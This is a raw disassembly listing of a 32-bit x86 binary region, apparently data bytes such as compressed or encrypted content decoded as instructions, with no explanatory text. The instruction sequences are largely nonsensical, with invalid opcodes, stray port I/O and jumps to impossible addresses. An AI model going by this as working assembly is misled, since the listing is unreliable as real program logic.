  414501:	jae    0x414531
  414503:	mov    eax,?
  414505:	aad    0x0
  414507:	add    BYTE PTR ds:0x5f000001,al
  41450d:	ds pop ss
  41450f:	cmp    al,0xdb
  414511:	lock xchg BYTE PTR [ebx-0x68f0fbbb],cl
  414518:	push   0xa685e572
  41451d:	daa    
  41451e:	jp     0x41454d
  414520:	arpl   di,si
  414522:	lods   al,BYTE PTR ds:[esi]
  414523:	add    edi,DWORD PTR [edi]
  414525:	xchg   edi,eax
  414526:	mov    edi,0xced5c7fd
  41452b:	data16 xlat BYTE PTR ds:[ebx]
  41452d:	sbb    BYTE PTR [esi-0x16],bl
  414530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414531:	stos   BYTE PTR es:[edi],al
  414532:	sub    DWORD PTR [ecx+0x28c54ccd],ecx
  414538:	into   
  414539:	mov    edx,0x3ac6a34a
  41453e:	cs jb  0x41450d
  414541:	call   0x9b269471
  414546:	aaa    
  414547:	push   ecx
  414548:	xor    ah,ch
  41454a:	cld    
  41454b:	out    0x52,eax
  41454d:	ins    BYTE PTR es:[edi],dx
  41454e:	mov    al,0xb0
  414550:	ins    DWORD PTR es:[edi],dx
  414551:	inc    ebp
  414552:	inc    edi
  414553:	data16 out dx,al
  414555:	mov    ah,0x1
  414557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414558:	(bad)  
  414559:	jo     0x15caad24
  41455f:	popf   
  414560:	inc    ebx
  414561:	mov    dh,0x2d
  414563:	in     al,0xf9
  414565:	cdq    
  414566:	jge    0x414529
  414568:	sub    BYTE PTR [ebx],bh
  41456a:	rcl    DWORD PTR [edx],1
  41456c:	imul   DWORD PTR [esi]
  41456e:	dec    ebp
  414570:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414571:	pop    ecx
  414572:	int3   
  414573:	push   ebp
  414574:	(bad)  
  414575:	je     0x4145d5
  414577:	into   
  414578:	popa   
  414579:	les    esi,FWORD PTR [edx+0x1eceed21]
  41457f:	(bad)  
  414581:	inc    ecx
  414582:	dec    edx
  414583:	jne    0x41456d
  414585:	shl    BYTE PTR [eax-0x7f],cl
  414588:	sub    al,BYTE PTR [ebx-0x1e]
  41458b:	mov    bl,0x96
  41458d:	aad    0xc4
  41458f:	dec    ebx
  414590:	outs   dx,BYTE PTR ds:[esi]
  414591:	out    0x64,eax
  414593:	dec    edx
  414594:	iret   
  414595:	mov    al,ds:0x450bbca6
  41459a:	mov    eax,0xb6b08961
  41459f:	inc    ecx
  4145a0:	adc    ah,al
  4145a2:	and    al,0xba
  4145a4:	stc    
  4145a5:	cli    
  4145a6:	mov    cl,0xc2
  4145a8:	in     al,dx
  4145a9:	in     eax,0xa1
  4145ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145ac:	lea    edi,[ecx-0x3c8a85c6]
  4145b2:	ss test eax,0xdd179edb
  4145b8:	inc    ebp
  4145b9:	inc    esp
  4145ba:	mov    al,ds:0x7c4ec3cf
  4145bf:	or     ebx,edi
  4145c1:	retf   
  4145c2:	pop    edx
  4145c3:	xor    ah,BYTE PTR [edx-0x71]
  4145c6:	mov    eax,ds:0x90ac6888
  4145cb:	fisttp WORD PTR [edi-0x2d4dc540]
  4145d1:	pop    ds
  4145d2:	fdiv   QWORD PTR [ecx]
  4145d4:	jnp    0x414651
  4145d6:	add    al,0x51
  4145d8:	adc    ebp,esi
  4145da:	pop    ebx
  4145db:	dec    esi
  4145dc:	stos   DWORD PTR es:[edi],eax
  4145dd:	pop    ecx
  4145de:	sbb    edx,DWORD PTR [eax+0x23]
  4145e1:	inc    eax
  4145e2:	xor    eax,0xf25769cb
  4145e7:	cld    
  4145e8:	push   ss
  4145e9:	sub    BYTE PTR ds:0xda5567f2,0x8
  4145f0:	xchg   DWORD PTR [ebx+0x26],eax
  4145f3:	mov    bl,BYTE PTR [ecx-0xb900364]
  4145f9:	and    eax,0x6475cf48
  4145fe:	icebp  
  4145ff:	mov    dh,ah
  414601:	frstor ss:[esi+0x550ac8dc]
  414608:	add    esp,DWORD PTR [edi-0x4a]
  41460b:	shl    DWORD PTR [eax-0x78],cl
  41460e:	jecxz  0x414606
  414610:	or     al,0x0
	...
  414672:	add    BYTE PTR [eax],al
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0xc7
  414681:	or     al,0x55
  414683:	sahf   
  414684:	cmc    
  414685:	(bad)  
  414686:	add    BYTE PTR [eax],al
  414688:	add    eax,0x6c000001
  41468d:	cmp    eax,0xeb92348e
  414692:	outs   dx,BYTE PTR ds:[esi]
  414693:	pop    ebx
  414694:	lods   eax,DWORD PTR ds:[esi]
  414695:	out    dx,eax
  414696:	sub    cl,BYTE PTR [ecx+ebp*4]
  414699:	push   ds
  41469a:	adc    DWORD PTR ds:0xd8142c77,edi
  4146a0:	aad    0xf8
  4146a2:	push   ds
  4146a3:	mov    ebx,0xd0a645f8
  4146a8:	fild   WORD PTR [ebp-0x2f49cb19]
  4146ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146af:	add    DWORD PTR [ecx+edx*2+0x25],0xcc8bfa52
  4146b7:	jl     0x4146f8
  4146b9:	pushfw 
  4146bb:	mov    eax,0x36f83f36
  4146c0:	dec    esi
  4146c1:	dec    edx
  4146c2:	lock mov ebx,0x8cecf917
  4146c8:	ror    DWORD PTR [esp+ebp*2+0x24372bb1],0xd8
  4146d0:	stos   DWORD PTR es:[edi],eax
  4146d1:	jle    0x41469c
  4146d3:	adc    ah,bh
  4146d5:	aaa    
  4146d6:	enter  0x610f,0xfe
  4146da:	cmp    esi,DWORD PTR [edx]
  4146dc:	adc    al,BYTE PTR [esi+ebx*4]
  4146df:	nop
  4146e0:	sbb    BYTE PTR [ebx-0x25f8a74],0xa0
  4146e7:	mov    DWORD PTR [ebp+0x298b84d7],edx
  4146ed:	sub    eax,0x2ab3d7ac
  4146f2:	add    bh,BYTE PTR [ecx]
  4146f4:	xlat   BYTE PTR ds:[ebx]
  4146f5:	mov    edi,0xb1b577ff
  4146fa:	test   al,0xac
  4146fc:	mov    bh,0x77
  4146fe:	xor    eax,0xe3919fac
  414703:	cmp    eax,0x19896011
  414708:	fdiv   st(2),st
  41470a:	ins    BYTE PTR es:[edi],dx
  41470b:	pop    ebp
  41470c:	xor    BYTE PTR [ecx],cl
  41470e:	push   0xffffff82
  414710:	lahf   
  414711:	xchg   esi,eax
  414712:	xor    dl,dh
  414714:	cli    
  414715:	mov    bh,0x0
  414717:	cs xchg dh,al
  41471a:	pushf  
  41471b:	popa   
  41471c:	jmp    0x4146f7
  41471e:	div    DWORD PTR [ebp+ebp*4-0x74b59979]
  414725:	loop   0x4146ce
  414727:	fcmovnu st,st(0)
  414729:	lds    ecx,FWORD PTR [esi]
  41472b:	push   0xffffffd8
  41472d:	int3   
  41472e:	mov    eax,0xdb9d5732
  414733:	out    dx,al
  414734:	or     eax,0x24928b7
  414739:	mov    cl,dh
  41473b:	popf   
  41473c:	or     al,0xbc
  41473e:	ret    
  41473f:	or     ch,cl
  414741:	retf   
  414742:	pop    edx
  414743:	ss mov edx,0x7464747e
  414749:	sbb    dh,al
  41474b:	cmp    BYTE PTR [edi],al
  41474d:	repnz out 0xca,al
  414750:	add    ch,BYTE PTR [ecx-0x1c286d8a]
  414756:	mov    ah,0x31
  414758:	clc    
  414759:	scas   al,BYTE PTR es:[edi]
  41475a:	push   0xfffffff8
  41475c:	mov    DWORD PTR [eax+esi*4-0x65f5732f],0x1eab8727
  414767:	add    esp,DWORD PTR ds:[ecx]
  41476a:	xchg   DWORD PTR [edi+0x21],edx
  41476d:	popa   
  41476e:	or     DWORD PTR [ebx+0x6823b913],ecx
  414774:	cmp    ebp,DWORD PTR [ecx+0x2d8785c9]
  41477a:	test   eax,0x8b9e2643
  41477f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414780:	jbe    0x4147b5
  414782:	mov    edx,0xbf194897
  414787:	mov    ebp,DWORD PTR [ebp+eax*1-0x1b8af1b0]
  41478e:	(bad)  
  41478f:	fisttp DWORD PTR [edi]
	...
  4147f1:	add    BYTE PTR [eax],al
  4147f3:	add    BYTE PTR [esi+0x2f],bh
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x1f531653
  414804:	cli    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    eax,0x39000001
  41480d:	sbb    dh,al
  41480f:	sbb    al,0x5c
  414811:	jmp    FWORD PTR ds:0xc28e0b0
  414817:	setbe  BYTE PTR [edi+eiz*8+0x54beb347]
  41481f:	mov    dl,0x7f
  414821:	xor    edx,eax
  414823:	pusha  
  414824:	xor    DWORD PTR [edx-0xa],0x40
  414828:	dec    ebx
  414829:	jp     0x414875
  41482b:	mov    eax,0xea803b56
  414830:	out    0x5e,al
  414832:	ret    
  414833:	inc    esi
  414834:	(bad)  
  414836:	fisttp QWORD PTR [ebx+0x5af62525]
  41483c:	sar    DWORD PTR [edi*1-0x755598af],1
  414843:	in     al,0x45
  414845:	out    0x85,eax
  414847:	jge    0x4148a2
  414849:	push   0x60
  41484b:	or     al,0x1e
  41484d:	aad    0x3e
  41484f:	adc    dh,BYTE PTR [esi-0x7f]
  414852:	pusha  
  414853:	cmp    al,0x70
  414855:	sub    al,BYTE PTR [eax]
  414857:	mov    bl,0x88
  414859:	je     0x4147fd
  41485b:	hlt    
  41485c:	out    0xe,eax
  41485e:	push   ebp
  41485f:	push   eax
  414860:	lock bswap esp
  414863:	sbb    bl,ah
  414865:	add    BYTE PTR [ebx+0x7c],bh
  414868:	jmp    DWORD PTR [edx+edx*2]
  41486b:	cmp    BYTE PTR [esp+eax*4],bh
  41486e:	(bad)  
  414870:	add    DWORD PTR [ebx],ebp
  414872:	(bad)
  414875:	out    dx,al
  414876:	(bad)  
  414877:	fnstsw WORD PTR [ebp-0x75]
  41487a:	xchg   ebx,eax
  41487b:	xor    DWORD PTR [ebx-0x55],eax
  41487e:	std    
  41487f:	popa   
  414880:	lock pop es
  414882:	fs jbe 0x414872
  414885:	call   0x3a02:0xe20f54ae
  41488c:	xchg   DWORD PTR [esi],ebx
  41488e:	pop    edi
  41488f:	pop    eax
  414890:	or     eax,0x1f1e195c
  414895:	ja     0x41484c
  414897:	jecxz  0x41484b
  414899:	enter  0xbd30,0x5
  41489d:	bswap  eax
  41489f:	xchg   edx,eax
  4148a0:	aam    0x45
  4148a2:	adc    ecx,ebp
  4148a4:	and    al,0x16
  4148a6:	add    dh,bl
  4148a8:	out    dx,al
  4148a9:	pop    edx
  4148aa:	out    0x0,eax
  4148ac:	xchg   ebp,eax
  4148ad:	jg     0x41489e
  4148af:	jmp    0x4148ed
  4148b1:	add    cl,bh
  4148b3:	sbb    BYTE PTR [ebx],ah
  4148b5:	add    edi,DWORD PTR [edx+0x37547e36]
  4148bb:	sbb    eax,0xab446ee4
  4148c0:	push   edx
  4148c1:	add    ch,ch
  4148c3:	outs   dx,DWORD PTR ds:[esi]
  4148c4:	xchg   ebx,eax
  4148c5:	(bad)  
  4148c6:	jmp    0xb5a1:0x3e673ea6
  4148cd:	imul   esp,DWORD PTR [eax-0x5bf051d4],0xffffffd2
  4148d4:	fnstsw WORD PTR [ebp-0x64efb922]
  4148da:	xchg   edx,eax
  4148db:	pop    ebp
  4148dc:	sar    DWORD PTR [ecx],1
  4148de:	cmp    BYTE PTR [ebx+0x3e9d1313],al
  4148e4:	add    al,0x86
  4148e6:	iret   
  4148e7:	(bad)  
  4148e8:	push   es
  4148e9:	out    0xbe,eax
  4148eb:	les    ebp,FWORD PTR [ebp-0x8064c35]
  4148f1:	ins    BYTE PTR es:[edi],dx
  4148f2:	cmp    DWORD PTR [edx-0x3016d69e],ebx
  4148f8:	mov    ah,0x8b
  4148fa:	les    edx,FWORD PTR [esi+edi*4]
  4148fd:	cmp    bh,al
  4148ff:	out    dx,al
  414900:	xor    bl,BYTE PTR [eax+ebp*1+0x62c0779]
  414907:	shl    DWORD PTR [ecx+edx*8-0x78ed4326],1
  41490e:	sub    BYTE PTR [edi+0x7c],al
	...
  414971:	add    BYTE PTR [eax],al
  414973:	add    BYTE PTR [ebx],cl
  414975:	jle    0x414949
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	sbb    ah,BYTE PTR [ebx]
  414982:	mov    eax,ds:0xd8ff38
  414987:	add    BYTE PTR ds:0x3c000001,al
  41498d:	enter  0x8712,0x52
  414991:	scas   al,BYTE PTR es:[edi]
  414992:	jecxz  0x4149a7
  414994:	shr    cl,0xc3
  414997:	test   DWORD PTR [ecx-0x7997d4d8],edi
  41499d:	loop   0x4149bd
  41499f:	mov    bh,0xf9
  4149a1:	xchg   edi,eax
  4149a2:	dec    ebx
  4149a3:	jnp    0x4149d1
  4149a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149a6:	push   ss
  4149a7:	lahf   
  4149a8:	(bad)  
  4149aa:	mov    bl,0x7
  4149ac:	mov    dh,0x66
  4149ae:	clc    
  4149af:	out    dx,al
  4149b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149b1:	jb     0x414a0f
  4149b3:	(bad)  
  4149b4:	or     ebx,DWORD PTR [esi-0x2f]
  4149b7:	or     DWORD PTR [edx-0x65a1a1da],edi
  4149bd:	(bad)  
  4149be:	cmp    BYTE PTR [edi+0x41],al
  4149c1:	cmp    DWORD PTR [esi+0x52fd56a1],ecx
  4149c7:	adc    dh,al
  4149c9:	imul   ebp,DWORD PTR [edx],0x54
  4149cc:	repz dec esp
  4149ce:	mov    edi,0xe9c95cb0
  4149d3:	shr    ah,cl
  4149d5:	jne    0x414a2c
  4149d7:	sbb    BYTE PTR [eax-0x83fe9a9],ch
  4149dd:	push   0xffffffde
  4149df:	into   
  4149e0:	ud1    eax,ebp
  4149e3:	cmc    
  4149e4:	sub    BYTE PTR [esi+ebp*4],bl
  4149e7:	fnstcw WORD PTR [ecx]
  4149e9:	int3   
  4149ea:	xchg   esp,eax
  4149eb:	ss daa 
  4149ed:	gs loope 0x4149da
  4149f0:	daa    
  4149f1:	jae    0x414a6d
  4149f3:	pop    esi
  4149f4:	clc    
  4149f5:	push   0xffffff95
  4149f7:	out    0x58,al
  4149f9:	(bad)  
  4149fa:	and    BYTE PTR [ecx+0x72],bh
  4149fd:	sbb    eax,0x617c6ff
  414a02:	sub    ch,ah
  414a04:	jno    0x414a43
  414a06:	int    0x7b
  414a08:	mov    ebp,0xcfaee8dc
  414a0d:	sub    BYTE PTR [edx+ebp*1+0x57],0xa2
  414a12:	popf   
  414a13:	popf   
  414a14:	(bad)  [edi-0x3e08c5cd]
  414a1a:	rcl    DWORD PTR [esi+0x6b],cl
  414a1d:	cmc    
  414a1e:	sbb    al,0x4
  414a20:	test   al,ch
  414a22:	adc    edx,DWORD PTR [ebx]
  414a24:	adc    eax,0x48d89d49
  414a29:	mov    ecx,0xb88efd31
  414a2e:	and    cl,BYTE PTR [esi+0x636ccd79]
  414a34:	mov    BYTE PTR [eax+0x2c],ah
  414a37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a38:	mov    bh,0x27
  414a3a:	mov    edi,0xdc446ef6
  414a3f:	add    eax,0x2512b65
  414a44:	or     BYTE PTR [ecx+ebx*2],al
  414a47:	sbb    BYTE PTR [eax+0x1c9c1284],al
  414a4d:	push   0xffffffb6
  414a4f:	(bad)  
  414a51:	aaa    
  414a52:	test   eax,0xfa2b8e49
  414a57:	mov    BYTE PTR [eax+eiz*1],cl
  414a5a:	test   eax,0xfd1e0361
  414a5f:	pop    ebp
  414a60:	loopne 0x414aa0
  414a62:	std    
  414a63:	jo     0x4149ef
  414a65:	push   ss
  414a66:	pop    edx
  414a67:	push   0xcbb8fbff
  414a6c:	aas    
  414a6d:	push   es
  414a6e:	dec    edi
  414a6f:	inc    esi
  414a70:	inc    ecx
  414a71:	mov    esp,0x887daaed
  414a76:	push   eax
  414a77:	xchg   ebp,eax
  414a78:	jmp    0x87a51c96
  414a7d:	adc    edi,DWORD PTR [ecx+0x64]
  414a80:	cmp    esp,edx
  414a82:	mov    DWORD PTR [ebx-0x1b],edx
  414a85:	aaa    
  414a86:	xor    al,0x46
  414a88:	ror    DWORD PTR [esi+0x69ad3dc],0xa4
  414a8f:	cwde   
  414a90:	mov    DWORD PTR [eax],0x0
	...
  414af2:	add    BYTE PTR [eax],al
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx+0x12ad63d9]
  414b02:	push   edx
  414b03:	sbb    eax,DWORD PTR [edx+ebx*8]
  414b06:	add    BYTE PTR [eax],al
  414b08:	add    eax,0xf7000001
  414b0d:	arpl   ax,ax
  414b0f:	out    dx,eax
  414b10:	push   ebp
  414b11:	(bad)  
  414b12:	in     al,dx
  414b13:	push   ss
  414b14:	adc    DWORD PTR [ebx+0x59e47c85],ecx
  414b1a:	inc    esi
  414b1b:	(bad)  
  414b1c:	lods   eax,DWORD PTR ds:[esi]
  414b1d:	mov    edx,0x6a4fda40
  414b22:	imul   bl
  414b24:	jae    0x414b55
  414b26:	pop    edi
  414b27:	mov    ebx,0x3404605
  414b2c:	push   esp
  414b2d:	or     ebp,edi
  414b2f:	pop    esi
  414b30:	dec    DWORD PTR [ecx+esi*8-0x56]
  414b34:	mov    ebx,0xe50b6a5e
  414b39:	xor    DWORD PTR [ecx+0x2d489cb1],ebp
  414b3f:	pop    ebx
  414b40:	push   ds
  414b41:	std    
  414b42:	jne    0x414b3a
  414b44:	sub    eax,DWORD PTR [ebx]
  414b46:	ret    0x89dd
  414b49:	cli    
  414b4a:	fs inc ebp
  414b4c:	rcr    ecx,1
  414b4e:	dec    edx
  414b4f:	retf   
  414b50:	je     0x414ada
  414b52:	cli    
  414b53:	mov    edi,DWORD PTR [edx]
  414b55:	adc    BYTE PTR [ecx],bl
  414b57:	xor    al,0xb2
  414b59:	fcom   QWORD PTR [esi-0x425e84f1]
  414b5f:	xor    eax,edx
  414b61:	cmc    
  414b62:	cld    
  414b63:	dec    eax
  414b64:	arpl   WORD PTR [edi-0x435a284b],si
  414b6a:	adc    al,0xf3
  414b6c:	out    0x6d,eax
  414b6e:	pushf  
  414b6f:	out    0x36,eax
  414b71:	fild   DWORD PTR [edi-0x17a4d5b5]
  414b77:	hlt    
  414b78:	lock mov esi,0xe4b0aeed
  414b7e:	pop    esi
  414b7f:	jae    0x414b1a
  414b81:	fnstenv [ebx+ebp*8-0x58]
  414b85:	lods   eax,DWORD PTR ds:[esi]
  414b86:	ds out dx,eax
  414b88:	shr    BYTE PTR [ebp+0x6c6383a4],0x18
  414b8f:	jne    0x414c02
  414b91:	adc    ah,0x95
  414b94:	mov    ah,0x57
  414b96:	jmp    0x5f3e0ed3
  414b9b:	in     eax,0x7c
  414b9d:	shl    BYTE PTR [ebx+0x762159a],0x53
  414ba4:	and    DWORD PTR [ebx],0x2f2151d6
  414baa:	mov    bl,0x40
  414bac:	call   0xedbdb3a1
  414bb1:	std    
  414bb2:	jecxz  0x414bc1
  414bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bb5:	mov    ah,0x8b
  414bb7:	mov    ah,0x6c
  414bb9:	lahf   
  414bba:	jo     0x414bd7
  414bbc:	mov    ecx,0x8baf3f50
  414bc1:	or     al,0xb9
  414bc3:	rol    BYTE PTR [eax-0x7f93c8ba],1
  414bc9:	inc    eax
  414bca:	ret    0x2c4a
  414bcd:	dec    eax
  414bce:	push   ebp
  414bcf:	cli    
  414bd0:	rol    DWORD PTR [ebp-0x550e2a44],0x63
  414bd7:	or     DWORD PTR [edx-0x73],esp
  414bda:	pop    ds
  414bdb:	jecxz  0x414be8
  414bdd:	(bad)  
  414bdf:	adc    al,0x32
  414be1:	cmc    
  414be2:	add    ebp,ecx
  414be4:	adc    al,0xda
  414be6:	aad    0xd3
  414be8:	mov    ebp,0x8a5bedab
  414bed:	sbb    al,0xe3
  414bef:	jecxz  0x414bc8
  414bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bf2:	cs push edx
  414bf4:	pop    ebx
  414bf5:	xchg   BYTE PTR [ebx+0xf8f6880],cl
  414bfb:	inc    esi
  414bfc:	xor    eax,0xfae95f26
  414c01:	pop    ebx
  414c02:	mov    edi,0x6a1eb8a7
  414c07:	inc    edi
  414c08:	inc    edi
  414c09:	push   ecx
  414c0a:	iret   
  414c0b:	sbb    eax,esp
  414c0d:	dec    ebx
  414c0e:	loop   0x414b95
  414c10:	push   ss
	...
  414c71:	add    BYTE PTR [eax],al
  414c73:	add    BYTE PTR [esp+eiz*2],dh
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	cs adc ebp,ebx
  414c81:	daa    
  414c82:	mov    esi,0xdb09b5
  414c87:	add    BYTE PTR ds:0x54000001,al
  414c8d:	mov    dh,0x6
  414c8f:	mov    esp,0xa7989344
  414c94:	mov    ah,0x26
  414c96:	or     DWORD PTR [esi-0x4e],esi
  414c99:	jle    0x414c32
  414c9b:	pop    ecx
  414c9c:	dec    eax
  414c9d:	cs int3 
  414c9f:	popa   
  414ca0:	scas   al,BYTE PTR es:[edi]
  414ca1:	jecxz  0x414cdc
  414ca3:	and    BYTE PTR [edi],ch
  414ca5:	pop    edx
  414ca6:	nop
  414ca7:	adc    DWORD PTR [edi+0x3b],ecx
  414caa:	iret   
  414cab:	mov    bl,0x55
  414cad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cae:	mov    BYTE PTR [ecx],al
  414cb0:	inc    edx
  414cb1:	ret    0xe33a
  414cb4:	(bad)  
  414cb5:	xchg   ebp,edi
  414cb7:	adc    ch,BYTE PTR [esi]
  414cb9:	icebp  
  414cba:	fldenv ds:0xf30ed3f4
  414cc0:	mov    ebp,0xc60a2ec2
  414cc5:	stos   BYTE PTR es:[edi],al
  414cc6:	shr    DWORD PTR [ecx-0x6e65f767],cl
  414ccc:	rol    DWORD PTR [edx-0x3cd9776b],1
  414cd2:	push   ecx
  414cd3:	jp     0x414c83
  414cd5:	punpcklwd mm6,mm1
  414cd8:	les    eax,FWORD PTR [esi+esi*4-0x462696bb]
  414cdf:	es inc esi
  414ce1:	ss loopne 0x414c7d
  414ce4:	in     eax,dx
  414ce5:	pop    edi
  414ce6:	call   0x81f397b2
  414ceb:	push   ss
  414cec:	lods   eax,DWORD PTR ds:[esi]
  414ced:	lea    ebp,[ecx]
  414cef:	xlat   BYTE PTR ds:[ebx]
  414cf0:	mov    edi,0x7c5694c9
  414cf5:	push   edx
  414cf6:	cs mov edi,0x95ca5b
  414cfc:	jo     0x414d2e
  414cfe:	pop    edx
  414cff:	ds scas al,BYTE PTR es:[edi]
  414d01:	mov    ds:0x3bf04bb5,eax
  414d06:	fisttp DWORD PTR [esi-0x1c539c0f]
  414d0c:	xor    al,0xde
  414d0e:	sbb    eax,0x34389329
  414d13:	mov    cl,0x78
  414d15:	jnp    0x414d49
  414d17:	into   
  414d18:	enter  0x6533,0x8
  414d1c:	rcr    DWORD PTR [edx],0xfb
  414d1f:	into   
  414d20:	xchg   edx,eax
  414d21:	jb     0x414d41
  414d23:	cwde   
  414d24:	in     al,0x6c
  414d26:	data16 std 
  414d28:	div    BYTE PTR [eax+0x2dec0483]
  414d2e:	and    al,0x75
  414d30:	dec    eax
  414d31:	pop    esi
  414d32:	es mov dh,0x62
  414d35:	sbb    eax,DWORD PTR [edx+0x74d5080c]
  414d3b:	add    DWORD PTR [esi+edi*2-0x50],eax
  414d3f:	repnz or al,bh
  414d42:	ins    DWORD PTR es:[edi],dx
  414d43:	and    esi,ebx
  414d45:	test   al,0x8c
  414d47:	or     DWORD PTR [esi],ebx
  414d49:	int3   
  414d4a:	imul   esi,esp,0xffffffe9
  414d4d:	shr    DWORD PTR [edi],cl
  414d4f:	pop    esp
  414d50:	cmp    eax,0xc0e5f5c3
  414d55:	pop    ss
  414d56:	popf   
  414d57:	dec    edi
  414d58:	(bad)  
  414d59:	xor    BYTE PTR [ecx+0x7acd4732],ah
  414d5f:	mov    eax,DWORD PTR [esi]
  414d61:	and    esp,DWORD PTR [ebp-0x2b]
  414d64:	scas   eax,DWORD PTR es:[edi]
  414d65:	xor    cl,ah
  414d67:	push   edi
  414d68:	clc    
  414d69:	xchg   esi,eax
  414d6a:	leave  
  414d6b:	mov    dh,bh
  414d6d:	dec    esp
  414d6e:	sbb    cl,dl
  414d70:	xchg   ebp,eax
  414d71:	inc    ebp
  414d72:	cld    
  414d73:	cmp    ah,BYTE PTR [ecx]
  414d75:	xor    DWORD PTR [edi-0x24],ecx
  414d78:	ret    
  414d79:	and    cl,dl
  414d7b:	cmp    ch,dh
  414d7d:	adc    ebp,DWORD PTR gs:[edi]
  414d80:	das    
  414d81:	sub    esi,DWORD PTR [ebx+0x795f7eed]
  414d87:	dec    esp
  414d88:	xor    al,0x56
  414d8a:	test   eax,0x7e45296d
  414d8f:	dec    edi
  414d90:	or     eax,0x0
	...
  414df1:	add    BYTE PTR [eax],al
  414df3:	add    BYTE PTR [edi+0x3e911299],dh
  414df9:	fwait
  414dfa:	mov    bh,0xbf
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x19e1ff37
  414e04:	push   cs
  414e05:	fadd   QWORD PTR [eax]
  414e07:	add    BYTE PTR ds:0x5000001,al
  414e0d:	adc    BYTE PTR [edi+ebp*4-0x47696c1],dh
  414e14:	jae    0x414dce
  414e16:	rcl    BYTE PTR [ebx-0x685e52bc],0x47
  414e1d:	xlat   BYTE PTR ds:[ebx]
  414e1e:	ja     0x414e6e
  414e20:	fld    DWORD PTR [ecx+0x74]
  414e23:	int    0x5f
  414e25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e26:	pop    ebp
  414e27:	(bad)  
  414e28:	enter  0xf410,0xaa
  414e2c:	mov    ch,0x2a
  414e2e:	inc    esp
  414e2f:	sub    al,BYTE PTR [ebp-0x2f42117c]
  414e35:	iret   
  414e36:	shr    DWORD PTR [ecx+0x5b],1
  414e39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e3a:	shl    al,0xb
  414e3d:	or     eax,0x34c866a5
  414e42:	sti    
  414e43:	or     eax,0x70b996d7
  414e48:	dec    edx
  414e49:	and    al,0xf6
  414e4b:	jp     0x414e1c
  414e4d:	push   ebp
  414e4e:	mov    ?,WORD PTR [ecx]
  414e50:	test   DWORD PTR [edi-0x430218b7],eax
  414e56:	push   esp
  414e57:	push   ecx
  414e58:	or     edx,DWORD PTR [ebp+0x563ed056]
  414e5e:	arpl   WORD PTR [edi+0x56],si
  414e61:	mov    ds:0xfd44125f,eax
  414e66:	dec    ebp
  414e67:	mov    ecx,0xe002de91
  414e6c:	repnz inc edi
  414e6e:	mov    esi,0x45a75974
  414e73:	jne    0x414eaf
  414e75:	in     al,dx
  414e76:	xchg   edi,eax
  414e77:	shr    al,cl
  414e79:	jb     0x414e29
  414e7b:	pop    esi
  414e7c:	mov    ecx,0xf66340af
  414e81:	cmp    al,0x7b
  414e83:	repz mov edx,0xc469f7fc
  414e89:	jno    0x414edb
  414e8b:	xchg   BYTE PTR [esi+0x7003030d],bh
  414e91:	xchg   ecx,eax
  414e92:	dec    esi
  414e93:	shr    BYTE PTR [ecx],cl
  414e95:	rcl    DWORD PTR [edx-0x6a1482dd],1
  414e9b:	or     eax,0xf80cb040
  414ea0:	pushf  
  414ea1:	sub    ebx,DWORD PTR ds:[edx-0x19]
  414ea5:	push   ebx
  414ea6:	cmp    eax,0xc5a69763
  414eab:	in     eax,0x2d
  414ead:	and    BYTE PTR [ebx+edx*2],al
  414eb0:	mov    ah,0xa3
  414eb2:	dec    esi
  414eb3:	adc    ebx,DWORD PTR [edi-0x23d3808d]
  414eb9:	jmp    0x692a08f7
  414ebe:	rcr    BYTE PTR [ebp+0x3853ab81],cl
  414ec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ec5:	mov    ds:0xd63cdeff,al
  414eca:	(bad)  
  414ecb:	repnz pushf 
  414ecd:	(bad)  
  414ece:	frstor [ebx]
  414ed0:	cld    
  414ed1:	add    DWORD PTR [ecx+0x6c],esi
  414ed4:	mov    esi,?
  414ed6:	fisub  WORD PTR [edi+ebx*2-0x2a]
  414eda:	je     0x414ed9
  414edc:	mov    al,0x3c
  414ede:	jmp    0xc21a:0x916fef72
  414ee5:	xlat   BYTE PTR ds:[ebx]
  414ee6:	jae    0x414f2e
  414ee8:	lahf   
  414ee9:	int3   
  414eea:	jmp    0xdb35:0xf57789a3
  414ef1:	test   BYTE PTR [edi+edx*1],0xb0
  414ef5:	mov    dl,0x87
  414ef7:	std    
  414ef8:	mov    eax,0x157afa01
  414efd:	jnp    0x414e98
  414eff:	lahf   
  414f00:	lods   eax,DWORD PTR ds:[esi]
  414f01:	call   0xbad99dc8
  414f06:	adc    BYTE PTR [esi+0x23d6dfb8],bl
  414f0c:	es mov ecx,0x5c3244
	...
